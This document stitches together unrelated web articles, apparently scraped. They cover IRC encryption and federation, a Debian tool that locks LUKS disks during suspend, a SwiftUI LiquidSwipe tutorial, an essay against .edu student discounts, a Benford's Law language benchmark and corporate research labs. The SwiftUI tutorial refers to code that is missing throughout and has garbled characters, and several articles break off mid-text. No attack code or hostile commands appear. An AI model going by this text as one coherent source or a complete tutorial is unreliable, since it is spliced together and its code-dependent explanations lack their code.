<p>Even though encryption is not mandated by IRC or enabled by default in many cases, you can still enforce encrypted client-server or server-server connections on your IRC server. This means that all messages in transit between clients and your server would be encrypted (usually with TLS) and the only weakness would be logs on the servers themselves or logs on client machines. If you and your friends like the plain text medium, it’s entirely possible to set up an IRC server which mandates encryption and doesn’t store logs long-term. If you’re in a group of people you can trust to be competent then it’s entirely possible to make IRC work this way and have a reasonable guarantee of privacy and security.</p>
<p>I suppose I should also mention the federating aspect of IRC since that’s quite a hot topic in the open source social platform world. IRC does federate in a way, but it’s not quite like the way Pleroma or Mastodon do. In the world of IRC, IRC networks are made up of one or more IRC servers. If you connect to an IRC server, you can view and interact with any channels or users on the same network that server is a part of. The way IRC exists right now is due to several network splits (netsplits) where many servers decided to split off of a big network to form their own, separate network several times throughout IRC history. This is similar to having a group of several Mastodon/Pleroma instances which have decided to federate with nobody else except those also in the group and is why we have the Freenode IRC network alongside the Undernet, EFnet, and so on.</p>
<p>The reason why this isn’t really such a big issue when it comes to IRC though is that IRC doesn’t really have accounts. Sure, you can usually register a nickname with a network’s NickServ bot to reserve it, but that’s not mandatory on most networks. This means you can join however many IRC networks you want with little hassle; you just have to connect and set your nick.</p>
<p>So, overall, IRC is still a really useful and good platform especially for software minimalists and technical users who wish to have a relatively hassle-free experience. IRC is great for open collaboration and quick support in free software projects (far better than Slack or Discord) and it can be made to work for private chats as long as you can trust everyone in the group to be competent. Yes, IRC is not necessarily great for non-technical users or those who require extensive guarantees of security; it might even be too much of a hassle for you, but this doesn’t mean it’s dead, useless, or outdated. IRC is not only still useful, but can still be the best tool for the job in the modern age. There are also improvements coming in the form of <a href="https://ircv3.net/">IRCv3</a>.</p>

<h2 id="Introducing_cryptsetup-suspend"><a name="index1h2"></a>Introducing cryptsetup-suspend</h2>

<p>Today, we're introducing <code>cryptsetup-suspend</code>, whose job is to protect the content of your harddrives while the system is sleeping.</p>

<p><strong>TL;DR:</strong></p>

<ul>
<li>You can lock your encrypted harddrives during suspend mode by <a href="#index6h2">installing <code>cryptsetup-suspend</code></a></li>
<li>For <code>cryptsetup-suspend</code> to work properly, at least Linux kernel 5.6 is required</li>
<li>We hope that in a bright future, everything will be available out-of-the-box in Debian and it's derivatives</li>
</ul>


<p><strong>Before:</strong></p>

<p><img src="https://blog.freesources.org/images/timeline_old.svg" alt="timeline_old.svg"></p>

<p><strong>After:</strong></p>

<p><img src="https://blog.freesources.org/images/timeline_new.svg" alt="timeline_new.svg"></p>

<h2 id="Table_of_contents"><a name="index2h2"></a>Table of contents</h2>




<h2 id="What_does_this_mean_and_why_should_you_care_about_it.3F"><a name="index3h2"></a>What does this mean and why should you care about it?</h2>

<p>If you don't use full-disk encryption, don't read any further. Instead, think about, what will happen if you lose your notebook on the train, a random person picks it up and browses through all your personal pictures, e-mails, and tax records. Then encrypt your system and come back.</p>

<p>If you believe full-disk encryption is necessary, you might know that it only works when your machine is powered off. Once you turn on the machine and decrypt your harddrive, your encryption key stays in RAM and can potentially be <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">extracted by malicious software or physical access</a>. Even if these attacks are non-trivial, it's enough to worry about. If an attacker is able to extract your disk encryption keys from memory, they're able to read the content of your disk in return.</p>

<p>Sadly, in 2020, we hardly power off our laptops anymore. The sleep mode, also known as "suspend mode", is just too convenient. Just close the lid to freeze the system state and lift it anytime later in order to continue. Well, convenience usually comes with a cost: during suspend mode, your system memory is kept powered, all your data - including your encryption keys - stays there, waiting to be extracted by a malicious person.&nbsp; Unfortunately, there are <a href="https://blog.appsecco.com/breaking-full-disk-encryption-from-a-memory-dump-5a868c4fc81e">practical attacks</a> to extract the data of your powered memory.</p>

<p>Cryptsetup-suspend expands the protection of your full-disk encryption to all those times when your computer sleeps in suspend mode. Cryptsetup-suspend utilizes the suspend feature of <a href="https://gitlab.com/cryptsetup/cryptsetup/blob/master/README.md">LUKS</a> volumes and integrates it with your Debian system. Encryption keys are evicted from memory before suspend mode and the volumes have to be re-opened after resuming - potentially prompting for the required passphrases.</p>

<p>By now, we have a working prototype which we want to introduce today. We did quite some testing, both on virtualized and bare-metal Debian and Ubuntu systems, with and without graphical stack, so we dare to unseal and set free the project and ask you - the community - to test, review, criticize and give feedback.</p>

<p><strong>Here's a screencast of <code>cryptsetup-suspend</code> in action:</strong></p>

<h2 id="State_of_the_implementation.3A_where_are_we.3F"><a name="index4h2"></a>State of the implementation: where are we?</h2>

<p>If you're interested in the technical details, here's how <code>cryptsetup-suspend</code> works internally. It basically consists of three parts:</p>

<p><img src="https://blog.freesources.org/images/cryptsetup-suspend.svg" alt="cryptsetup-suspend.svg"></p>

<ol>
<li><code>cryptsetup-suspend</code>: A C program that takes a list of LUKS devices as arguments, suspends them via <code>luksSuspend</code> and suspends the system afterwards. Also, it tries to reserve some memory for decryption, which we'll explain below.</li>
<li><code>cryptsetup-suspend-wrapper</code>: A shell wrapper script which works the following way:

<ol>
<li>Extract the initramfs into a ramfs</li>
<li>Run (systemd) pre-suspend scripts, stop udev, freeze almost all <a href="https://en.wikipedia.org/wiki/Cgroups">cgroups</a></li>
<li>Chroot into the ramfs and run <code>cryptsetup-suspend</code></li>
<li>Resume initramfs devices inside chroot after resume</li>
<li>Resume non-initramfs devices outside chroot</li>
<li>Thaw groups, start udev, run (systemd) post-suspend scripts</li>
<li>Unmount the ramfs</li>
</ol>
</li>
<li>A systemd unit drop-in file overriding the <code>Exec</code> property of <code>systemd-suspend.service</code> so that it invokes the script <code>cryptsetup-suspend-wrapper</code>.</li>

<p>Reusing large parts of the existing cryptsetup-initramfs implementation has some positive side-effects: Out-of-the-box, we support all LUKS block device setups that have been supported by the Debian cryptsetup packages before.</p>

<p>Freezing most processes/cgroups is necessary to prevent possible race-conditions and dead-locks after the system resumes. Processes will try to access data on the locked/suspended block devices eventually leading to buffer overflows and data loss.</p>

<h2 id="Technical_challenges_and_caveats"><a name="index5h2"></a>Technical challenges and caveats</h2>

<ul>
<li><strong>Dead-locks at suspend</strong>: In order to prevent possible dead-locks between suspending the encrypted LUKS disks and suspending the system, we have to tell the Linux kernel to <em>not</em> <code>sync()</code> before going to sleep. A <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c052bf82c6b00ca27aab0859addc4b3159dfd3a4">corresponding patch</a> got accepted upstream in Linux 5.6. See section <a href="#What_about_the_kernel_patch.3F">What about the kernel patch?</a> below for details.</li>
<li><strong>Race conditions at resume</strong>: Likewise, there's a risk of race conditions between resuming the system and unlocking the encypted LUKS disks. We went with freezing as many processes as possible as a counter measurement. See last part of section <a href="#State_of_the_implementation.3A_where_are_we.3F">State of the implementation: where are we?</a> for details.</li>
<li><strong>Memory management</strong>: Memory management is definitely a challenge. Unlocking disks might require a lot of memory (if <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a> is argon2i) and the swap device most likely is locked at that time. See section <a href="#All_that_matters_to_me_is_the_memories.21">All that matters to me is the memories!</a> below for details.</li>
<li><strong>systemd dependency</strong>: Our implementation depends on systemd. It uses a unit drop-in file for <code>systemd-suspend.service</code> for hooking into the system suspend process and depends on systemds cgroup management to freeze and thaw processes. If you're using a different init system, sorry, you're currently out of luck.</li>
</ul>


<h3 id="What_about_the_kernel_patch.3F"><a name="index1h3"></a>What about the kernel patch?</h3>

<p>The problem is simple: the Linux kernel suspend implementation enforces a <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/power/suspend.c?h=v5.5#n569">final filesystem sync() before the system goes to sleep</a> in order to prevent potential data loss. While that's sensible in most scenarios, it may result in dead-locks in our situation, since the block device that holds the filesystem is already suspended. The <code>fssync()</code> call will block forever as it waits for the block device to finish the <code>sync()</code> operation. So we need a way to conditionally disable this <code>sync()</code> call in the Linux kernel resume function. That's what <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c052bf82c6b00ca27aab0859addc4b3159dfd3a4">our patch</a> does, by introducing a run-time switch at <code>/sys/power/sync_on_suspend</code>, but it only got accepted into the Linux kernel recently and was first released with Linux kernel 5.6.</p>

<p>Since release 4.3, the Linux kernel at least provides a build-time flag to disable the <code>sync()</code>: <code>CONFIG_SUSPEND_SKIP_SYNC</code> (that was called <code>SUSPEND_SKIP_SYNC</code> first and renamed to <code>CONFIG_SUSPEND_SKIP_SYNC</code> in kernel release 4.9). Enabling this flag at build-time protects you against the dead locks perfectly well. But while that works on an individual basis, it's a non-option for the distribution Linux kernel defaults. In most cases you still want the <code>sync()</code> to happen, except if you have user-space code that takes care of the <code>sync()</code> just before suspending your system - just like our <code>cryptsetup-suspend</code> implementation does.</p>

<p>So in order to properly test <code>cryptsetup-suspend</code>, you're strongly advised to run Linux kernel 5.6 or newer. Fortunately, Linux 5.6 is available in <code>buster-backports</code> thanks to the Debian Kernel Team.</p>

<h3 id="All_that_matters_to_me_is_the_memories.21"><a name="index2h3"></a>All that matters to me is the memories!</h3>

<p>One of the tricky parts is memory management. Since version 2, LUKS uses argon2i as default key derivation function. Argon2i is a memory-hard hash function and LUKS2 assigns the minimum of half of your systems memory or 1 GB to unlocking your device. While this is usually unproblematic during system boot - there's not much in the system memory anyway - it can become problematic when suspending. When cryptsetup tries to unlock a device and wants 1 GB of memory for this, but everything is already occupied by your browser and video player, there's only two options what to do:</p>

<ol>
<li>Kill a process to free some memory</li>
<li>Move some of the data from memory to swap space</li>
</ol>


<p>The first option is certainly not what you expect when suspending your system. The second option is impossible, because swap is located on your harddrive which we have locked before. Our current solution is to allocate the memory after freezing the other processes, but before locking the disks. At this time, the system can still move data to swap, but it won't be accessed anymore. We then release the memory just in time for cryptsetup to claim it again. The implementation of this is still subject to change.</p>

<p><img src="https://blog.freesources.org/images/memories.gif" alt="memories.gif"></p>

<h3 id="What.27s_missing.3A_A_proper_user_interface"><a name="index3h3"></a>What's missing: A proper user interface</h3>

<p>As mentioned before, we consider <code>cryptsetup-suspend</code> usable, but it certainly still has bugs and shortcomings. The most obvious one is lack of a proper user interface. Currently, we switch over to a tty command-line interface to prompt for passphrases when unlocking the LUKS devices. It certainly would be better to replace this with a graphical user interface later, probably by using plymouth or something alike. Unfortunately, it seems rather impossible to spawn a real graphical environment for the passphrase prompt. That would imply to load the full graphical stack into the ramfs, raising the required amount of memory significantly. Lack of memory is currently our biggest concern and source of trouble.</p>

<p>We'd definitely appreciate to learn about your ideas how to improve the user experience here.</p>

<h2 id="Let.27s_get_practical.3A_how_to_use"><a name="index6h2"></a>Let's get practical: how to use</h2>

<p><strong>TL;DR:</strong> On Debian Bullseye (Testing), all you need to do is to install the <a href="https://packages.debian.org/experimental/cryptsetup-suspend"><code>cryptsetup-suspend</code> package from experimental</a>. It's not necessary to upgrade the other cryptsetup packages. On Debian Buster, cryptsetup packages from backports are required.</p>

<ol>
<li>First, be sure that you're running Linux kernel 5.6 or newer. For Buster systems, it's available in <a href="https://packages.debian.org/buster-backports/linux-image-amd64">buster-backports</a>.</li>
<li>Second, if you're on Debian Buster, install the <a href="https://packages.debian.org/buster-backports/cryptsetup">cryptsetup 2:2.3.3-2~bpo10+1 packages from buster-backports</a>.</li>
<li>Third, install the <a href="https://packages.debian.org/experimental/cryptsetup-suspend"><code>cryptsetup-suspend</code> package from experimental</a>. Beware that <code>cryptsetup-suspend</code> depends on <code>cryptsetup-initramfs (&gt;= 2:2.3.3-1~)</code>. Either you need the cryptsetup packages from <code>testing/unstable</code>, or the backports from <code>buster-backports</code>.</li>
<li>Now that you have the <code>cryptsetup-suspend</code> package installed, everything should be in place: Just send your system to sleep. It should switch to a virtual text terminal before going to sleep, ask for a passphrase to unlock your encrypted disk(s) …</li></ol></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                    <p>With the iOS 13 release Apple has introduced a new tool - <a rel="nofollow" href="https://developer.apple.com/xcode/">SwiftUI</a>, calling it â€œan innovative, exceptionally simple way to build user interfaces across all Apple platforms with the power of Swiftâ€�.  Released on September 19th, it remains one of the hottest news in October with a number of useful and easy to follow  <a rel="nofollow" href="https://developer.apple.com/tutorials/swiftui">examples and tutorials</a> have been published alongside it. Indeed, developing and implementing simple interfaces seems intuitive and fast. What about creating something more exciting?</p>
<p>We are going to try implementing <a rel="nofollow" href="https://github.com/Cuberto/liquid-swipe">LiquidSwipe</a> using <strong>SwiftUI</strong> - a slider for switching between pages with a beautiful animation that could be used for flicking through stories in iOS  apps with social features or for navigation through an onboarding.</p>
<p><img src="https://exyte.com/upload/liquid_swipe_brighter-compressed.gif" alt="" title="SwiftUI slider example"></p><p>SwiftUI slider example</p>
<h2>LiquidSwipeView for a SwiftUI slider</h2>
<p>We need a new View that will represent our control:</p>

<p><code>View</code> will display the content of the current page, as well as two sliders on both sides for changing pages:</p>

<p><code>ZStack</code> is a simple container that displays its contents on top of each other, which makes it perfectly suited for creating overlapping elements in SwiftUI. In this tutorial, the left and right sliders are situated above the main page.</p>
<p><code>edgesIgnoringSafeArea()</code> lets us render the contents on the whole area of the visible interface, ignoring, well, the safe area. </p>
<p>Slider parameters are represented with state <em>variables</em>, described later in the tutorial:</p>

<p>Noteworthy, unlike the original framework by <em>Cuberto</em>, we wanted to try implementing two sliders with SwiftUI. Due to this, we have to define the side of the slider we are referencing:</p>

<h2>Content</h2>
<p>In our simple example each page is just an empty colored rectangle:</p>

<p>All available page background colors are defined in an array of constants - <code>Config.colors</code>. In the code example below, we select the current page using the <code>pageIndex</code> variable:</p>

<p><code>@State</code> variables are a very powerful SwiftUI feature, where the user interface is automatically reloaded after the variable changes. For example, in this case it means that setting <code>pageIndex = 1</code> will prompt the page change and a UI update.</p>
<h2>Silder inplementation with SwiftUI</h2>
<p>Letâ€™s check the slider implementation:</p>

<p>The first point of interest is the type of the data variable - <code>Binding&lt;SliderData&gt;</code>. In SwiftUI, it means that we not only have access to the value of the variable, but can change the value as well. Note that there is something new here, a dollar sign next to the name of the value:</p>

<p>We use thisfeature in the wave method, which sets the shape of the slider so the interface would have that liquid look. In other cases we retrieve the value by calling <code>data.wrappedValue</code>.</p>
<p>So far, the slider uses a <code>ZStack</code> and includes a wave and a button. Additionally we define two more container parameters which we shall discuss in detail:</p>

<p>By changing <code>zIndex</code> we can set the order of the elements in the <code>ZStack</code>. We control it using the <code>topSlider</code> variable:</p>

<p>This variable represents the slider that is currently on top. When we interact with either slider, we set this variable to show the active slider above the other.</p>

<p><code>offset</code> lets us move the slider a bit to the right or to the left. We define the following state variable:</p>

<p>The slider does not have an offset most of the time. However, during the page change animation we hide the new sliders by setting <code>sliderOffset = 100</code>, and then revert this value to display the sliders. Apple made it quite simple to create this animation using SwiftUI:</p>

<p><img src="https://exyte.com/upload/1.gif" alt="" title="SwiftUI animation"></p><p>SwiftUI animation</p>
<p>By default, iOS uses linear animation. However we can customize it using <code>withAnimation</code> parameters:</p>
<p>
Look how nice spring animation looks:</p>
<p><img src="https://exyte.com/upload/2.gif" alt="" title="SwiftUI spring animation"></p><p>SwiftUI spring animation</p>
<h2>Button</h2>
<p>The button consists of a gray circle and a white arrow that is backed up by simple math:</p>

<p>During the definition of the <code>ZStack</code> contents the center of the button is situated in the (0, 0) point. After that we use the offset method to move the button to the desired point (which is calculated using <code>SliderData</code> - it will be described a bit later). By doing this, we automatically set the transparency of the button - the further we move the slider, the more transparent it gets. </p>
<p><img src="https://exyte.com/upload/Untitled-1.gif" alt="" title="SwiftUI button animation"></p><p>SwiftUI button animation</p>
<h2>Wave</h2>
<p>We use a separate object for presenting the wave - <code>WaveView</code>. It is created (and set up with the background and gestures) in the wave method:</p>

<p>The index function returns the index of the next (or previous) page - depending on the side of the slider. It also handles switching between the first and the last page:</p>

<p>Now we need to define 3 gestures:
Getting hold of the slider and switching the page, during which the wave is updated.
Letting go of the wave, where we have to either change the page, or return the wave to the original position.
Tapping the wave, resulting in an instant page switch.</p>
<p>All gestures are combined into one, that can be used for setting up <code>WaveView</code>:</p>

<p>Here are the gestures at a closer look.</p>
<h3>1. Drag gesture</h3>
<p>During the page switch, first thing we do is persist the side of the wave, to render it on top:
</p>
<p>Then, we calculate the new state of the wave using the current state and the movement values:
</p>
<p>The state calculation is rather straightforward and will be presented after describing <code>SliderData</code> contents.</p>
<h2>2. Drop gesture in SwiftUI</h2>
<p>This is a slightly more complicated gesture:</p>

<p>First we check if the slider is far enough to trigger a page change. Otherwise it should be returned to the original position by calling the already familiar <code>withAnimation</code> method:</p>
<p><img src="https://exyte.com/upload/4.gif" alt=""></p><p>A separate function is responsible for initiating a page switch: </p>

<p>In the beginning we animate the wave to the final position. Then, after a short delay, we change the page, return the wave to the original state, and animate the new sliders by changing the <code>sliderOffset</code> variable.</p>
<p><img src="https://exyte.com/upload/5.gif" alt="" title="SwiftUI page change"></p><p>SwiftUI page change</p>
<h3>3. Tap gesture</h3>
<p>Tapping a wave combines two actions described above. First we save the wave that should be drawn on top:
</p>
<p>Then the page switch is initiated.
</p>
<h2>SliderData</h2>
<p>3 key parameters comprise slider data: the side of the slider, the vertical coordinate of the wave center, and the progress of the page switch (ranges from 0 to 1).</p>

<p>All other parameters are calculated dynamically from the key parameters:</p>
<p><img src="https://exyte.com/upload/liquidswipe_q.png" alt=""></p><p>Now, what all these parameters are used for? Initially we create data for each slider with zero progress and a different center for the right and left waves.</p>

<p>After the swipe we set the wave to the initial or final state. In this case the center of the wave doesnâ€™t change, and the progress is set to the either end of the range:</p>

<p>Dragging the wave isnâ€™t much more complicated:</p>

<p>The progress is linearly dependant on the waveâ€™s horizontal position, and the wave center is equal to the tapping point.</p>
<p>The method used to decide if the page should be changed is also rather simple:</p>

<p>We simply compare the current progress with an arbitrary constant (0.15 in this case), and revert the wave to the original position if the threshold is not met.</p>
<h2>WaveView</h2>
<p>The last object we need to implement is the <code>WaveView</code>. Hereâ€™s how we do it:</p>

<p>It is a Shape that uses the same 3 parameters as <code>SliderData</code>. The only difference is that the center of the wave and the progress can change. It is necessary so that SwiftUI can automatically animate the wave with access to only the beginning and final states.</p>
<p>To make this possible we define in SwiftUI <code>animatableData</code> variable:</p>

<p>We use this variable to represent the state of the wave as 2 floating point numbers and describe how to get and set them. This is enough to automatically animate the wave, because SwiftUI can animate floating point numbers from the box.</p>
<p>Finally, the path function defines the shape of the wave.</p>

<p>This method is verbose and mathematically complex, so we wonâ€™t include the code in the tutorial. You can check out the full implementation on the <a rel="nofollow" href="https://github.com/exyte/LiquidSwipe">GitHub</a>.</p>
<h2>Conclusion</h2>
<p>As you can see, <strong>SwiftUI</strong> is great not only for simple UI creation. Complex controls and effects can also be efficiently and succinctly described by this new tool, which this tutorial hopefully demonstrated. We have no doubt that SwiftUI will become a new standard for declarative interface creation on Apple platforms, so any Apple developer might want to consider familiarising themselves with it. Don't forget to check out another one of our <a href="https://exyte.com/blog/replicating-apple-card-application-using-swiftui">SwiftUI</a> tutorials and best of luck! </p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody"><p>I create an educational product and students occasionally ask for discounts. So-called "educational" discounts are very popular, but I don't give them.</p> <p>To be honest, I don't like them at all, but there is some nuance.</p> <p>Not all educational discounts bother me—primarily it's the discounts limited to students at degree-granting institutions and especially those tied to having a .edu email address.</p> <h2 id="why-might-edu-discounts-be-good"><a href="#why-might-edu-discounts-be-good">#</a> Why might .edu discounts be good?</h2> <p>Many of the arguments for student discounts are similar to those for region-based discounts, which I am a fan of. So let's look at some reasons to give discounts in general.</p> <h3 id="need"><a href="#need">#</a> Need</h3> <p>The idea behind student discounts, at least as it was first explained to me, sounds great. Students are often broke so it's only fair to give them a price break!</p> <p>I totally get that. As a student myself, I worked as a waiter, a calculus tutor, a bar tender and even started a house painting franchise in order not to get buried in debt. I went to a cheap state school, back when it was only about 70% of what it costs now, and I was <em>still</em> broke.</p> <p>I have a great deal of sympathy for anyone trying to pay their way through school in the US now. I have even more sympathy for anyone taking out debts they likely won't repay for many, many years.</p> <h3 id="price-discrimination"><a href="#price-discrimination">#</a> Price discrimination</h3> <p>In economics, <a href="https://www.economicshelp.org/microessays/pd/price-discrimination/" target="_blank" rel="noopener noreferrer">price discrimination</a> refers to the idea of charging some customers more than others in order to maximize revenue.</p> <p>In the extreme form, it would mean charging each customer the absolute maximum price they're willing to pay and completely eliminating <a href="https://www.economicshelp.org/blog/188/concepts/definition-of-consumer-surplus/" target="_blank" rel="noopener noreferrer">consumer surplus</a>. This isn't practical or possible in most cases, but less extreme forms are very common.</p> <p>Sometimes customers are segmented by their actions, such as spending time clipping coupons or watching movies during typical work hours. Other times, customers are segmented simply by who they are. Senior discounts or higher prices for foreign tourists are both common examples.</p> <p>A less direct form of price discrimination is to create a slightly different product that would only appeal to customers with more money. In software, we see this often with features revolving around team management, accounting and compliance. This makes it possible to both sell to frugal hobbyist users and to charge large companies very high prices.</p> <h3 id="creating-habits"><a href="#creating-habits">#</a> Creating habits</h3> <p>For most, going to college is a time of major life transitions. Other than marriage, having children or serving in the military there are few times when people change as much.</p> <p>This is <strong>incredibly</strong> appealing to marketers.</p> <p>The opportunity to reach people when they're at a place where they're open to creating so many new habits that will stick with them for years or even decades is worth spending heavily on. One way to do it is through advertising. Another is by giving students a steep discount.</p> <h2 id="the-problem"><a href="#the-problem">#</a> The problem</h2> <p>In a number of ways that matter to me, educational discounts <em>as they are typically implemented</em> are radically different from region or need-based discounts.</p> <h3 id="who-has-a-edu-email-address"><a href="#who-has-a-edu-email-address">#</a> Who has a .edu email address?</h3> <p>Who has a .edu email address? Generally it's only students, faculty and alumni of accredited US colleges. This roughly translates to "many of the most priviledged people in the world".</p> <p>The vast majority of adults in the US <a href="https://data.census.gov/cedsci/table?q=ACSST1Y2018.S1501&amp;g=0100000US&amp;tid=ACSST1Y2018.S1501&amp;hidePreview=true" target="_blank" rel="noopener noreferrer">do not have a 4-year degree</a>. There are probably a billion people in the world who would <em>love</em> to either enter a US college themselves or get their children into one.</p> <p>Competition for those slots is fierce. People spend small fortunes on English language education for a shot. I've seen it first-hand living in Asia for most my adult life.</p> <p>Obviously, not <em>everyone</em> with a .edu email address is or will be wealthy. However in aggregate, their parents are wealthier and they will be wealthier than any country in the world... by a large margin. At a minimum, getting a 4-year degree costs tens of thousands of dollars. Saving a few dollars a month on my <a href="https://alchemist.camp/episodes" target="_blank" rel="noopener noreferrer">screencasts</a> is trivial in comparison.</p> <p>In contrast, the average person in Nigeria earns 2,000 USD/year. Even the average programmer isn't making much compared to their counterparts in other countries. Nigerians are also a double digit percentage of my audience! Indians are a large percentage as well.</p> <p>I have a <em>completely</em> different reaction when someone living in poor country asks for a discount than I do when someone spending more per year on tuition than I earned until my late 20s does.</p> <h3 id="who-is-a-student"><a href="#who-is-a-student">#</a> Who is a student?</h3> <p>An even more salient question is, who counts as a student. I've spent a great deal of time as a non-credentialed student at language schools, at a programming school and even completely on my own with a self-designed curriculum.</p> <p>During those times, I wasn't very successful in asking for educational discounts since nearly all are tied to credential-offering schools. I often thought about why and settled on two answers.</p> <ol><li>They probably worry about non-students claiming to be students to get the discount.</li> <li>Their educational discounts weren't really motivated by any sense of altruism or fairness to begin with.</li></ol> <h3 id="hypocrisy"><a href="#hypocrisy">#</a> Hypocrisy</h3> <p>Perhaps the thing that <em>most</em> bothers me about student discounts I see announced is the virtue signalling.</p> <p>If you're offering a discount to get your customers hooked early in their careers or to raise prices for business users, great. But you're not doing a noble thing if you're restricting a discount to people with .edu addresses.</p> <p>What that discount model actually does is exclude all of the students in poorer parts of the world as well as anyone who couldn't stomach going $100k in debt for a credential.</p> <h3 id="what-does-the-discount-subsidize"><a href="#what-does-the-discount-subsidize">#</a> What does the discount subsidize?</h3> <p>As economists love to point out, incentives matter. When you subsidize something, you get more of it. This isn't just true of governments, but it's also true of companies and other groups.</p> <p>That leads ato the question of what educational discounts subsidize. In effect, they subsidize going to very expensive universities. Is this something we want more of?</p> <p>In what's likely a minority opinion, I think too many people pursue formalized schooling for too long.

<p>After watching a Netflix documentary about Benford’s Law, i got really interested in it because it can help detect fraud in e.g. balance sheets. So i searched my favorite programming languages and detected that there is no npm Package for checking Benford’s Law.</p>
<p>Sooo … Long story short: I created nearly identical libraries for doing a Benford’s Law check in JavaScript, Go and Crystal. My inspiration was from a Python library - so the algorithm of these libraries is nearly identical. There are some catches like i used many different math libraries for calculating chi-square and some of these libraries offer addition information, others not …</p>
<p>But i think this gives us a good example of a algorithm which is implemented in different programming languages and can be benchmarked. That’s what i wanna do in this post: Comparing the Benford’s Law check in different Languages.</p>

<p>I didn’t expected that big difference. Go is clearly the winner here and that with big distance to the other implementations. One reason why Python took so long may be that the used library shows additional information but i don’t think Python could compete with the other implementations if the library wouldn’t show more.</p>
<p>It is also noteworthy that Go is very very fast compiling. Crystal isn’t even in the area of the Go compile time.</p>

						<p><span>Once, small firms centred on inventors were responsible for most of our innovation. Larger firms might buy or exploit these steps forwards, but they did not typically make them. And then for a brief period, this changed: many of the best new products, tools, and ideas came from research labs within large corporations. This brief period also happened to be the era when scientific, technological, and economic productivity sped forward at its fastest ever clip. Yet almost as soon as it arrived, the fruitful period was over and we returned to a situation where small companies and small-business-like teams at universities developed innovations outside of large companies and sold them in a market for ideas. Though we might enjoy the innovation created by small flexible firms, we should not dismiss the contributions made by large corporate labs. The corporate lab may be creeping back, but aggressively prosecuting antitrust against large firms growing organically through in-house research could easily snuff this spark out.</span></p>
<h3>The USA’s first system of innovation</h3>
<p><span>When the USA began to contribute to the progress of technology, in the early 19th century, it was largely practically-minded, not based on deep scientific understanding. Rather, it largely consisted of individual inventors commercialising their own inventions. Whereas nuclear power depended on decades or centuries of progress in physics, many late 19th century innovations were more like the cotton gin, which came together through practical-minded trial and error in the field. By the late 19th century, the system had morphed into one we would find strangely familiar today: inventors invented, venture capitalists invested, and companies commercialised. The system even had </span><a href="https://www.cambridge.org/core/journals/business-history-review/article/patent-alchemy-the-market-for-technology-in-us-history/90991329A8D4A49EBF7B49D2EAD1CE7A"><span>patent lawyers</span></a><span> and </span><a href="https://www.hoover.org/sites/default/files/khan_ip2_working_paper.pdf"><span>non-practising entities</span></a>, <span>which own patents purely </span><a href="https://www.hbs.edu/businesshistory/Documents/BHR870102.pdf"><span>to litigate on their behalf</span></a><span>. There were still startups commercialising an idea and scaling it up themselves, but many inventors found that the division of labour enabled by the market ideas allowed them to </span><a href="https://www.cambridge.org/core/journals/business-history-review/article/patent-alchemy-the-market-for-technology-in-us-history/90991329A8D4A49EBF7B49D2EAD1CE7A"><span>focus on what they did best</span></a><span>.</span></p>
<p><span>Large firms were consumers of ideas created by inventors, and were sceptical of the value of doing in-house science. They believed it was easier to buy new science off the shelf. In 1885 T. D. Lockwood, head of American Bell Telephone Company’s patent department, said:&nbsp;</span></p>
<blockquote><p><span>“I am fully convinced that it has never, is not now, and never will pay commercially, to keep an establishment of professional inventors, or of men whose chief business it is to invent”</span></p></blockquote>
<p><span>Of course, Bell Labs itself later grew to be one of the marquees of commercial labs—in the late 1960s it employed 15,000 people including 1,200 PhDs, who between them made too many important inventions to list, from the transistor and the photovoltaic cell to the first digitally scrambled voice audio (in 1943) and the first complex number calculator (in 1939). Fourteen of its staff went on to win Nobel Prizes and five to win </span><a href="https://en.wikipedia.org/wiki/Turing_Award"><span>Turing Awards</span></a><span>. </span></p>
<p><span>The 1920s stock market boom was in large part driven by a huge rise in the value that investors </span><a href="https://pubs.aeaweb.org/doi/pdfplus/10.1257/aer.98.4.1370"><span>accorded to intangible capital</span></a><span> and ideas held within companies. A similar thing happened in the </span><a href="https://www.amazon.co.uk/Capitalism-Without-Capital-Intangible-Economy/dp/0691175039"><span>1990s Dot-com Bubble</span></a><span>. Between 1921 and 1927 the number of scientists and engineers in industrial labs more than doubled. When the stock market crashed and the Great Depression hit it caused a </span><a href="https://pdfs.semanticscholar.org/d71a/90cfa2d0d0d72f13724d27dd326209431974.pdf"><span>massive and persistent decline</span></a><span> in independent inventing and the startup-like activity around it. But large labs continued to boom, increasing staffing and research spending throughout the lean 1930s, and earning more patents. By 1930, most patents were issued to large firms, rather than independent innovators, and this gap only widened into the 1950s. The industrial lab had become king.</span></p>
<h3>Why labs work well</h3>
<p><span>The question of why the industrial lab works is a microcosm of the question of why the firm works in general. Economist Ronald Coase, who won the Nobel Prize in 1991 (and who lived to be 102) bookended the most productive period of his career with two insights about transaction costs. The first, published in 1937 and entitled </span><a href="https://onlinelibrary.wiley.com/doi/full/10.1111/j.1468-0335.1937.tb00002.x"><span>“The Nature of the Firm”</span></a><span>, tells us why firms exist. In economics, situations are typically approached from the perspective of competitive behaviour in open markets. Most of the things we buy are from open, competitive markets like these. But when we sell our labour, we are usually bound to a single “buyer”—our employer—for an extended period of time for everything we have to offer. If market competition is so efficient, why do we not set up mini-firms for every instance of cooperative work and receive pay in line with our output? Why do we instead generally sell a promise to do whatever our boss says within limits for certain hours of the day for months or years in advance?</span></p>
<p><span>The other, </span><a href="https://www.law.uchicago.edu/files/file/coase-problem.pdf"><span>“The Problem of Social Cost”</span></a><span>, reads like a reflection of the first. Published in 1960, it spawned the so-called Coase Theorem, which holds that so long as transaction costs—the costs of interacting with other individuals or institutions, such as the costs of drawing up and enforcing a contract—are low, people will contract to deal with the problems emerging from positive and negative externalities, like the benefits of a new park to a neighbourhood or the costs of pollution. Where transaction costs are too high, institutions and policies are needed to deal with the externalities instead.</span></p>
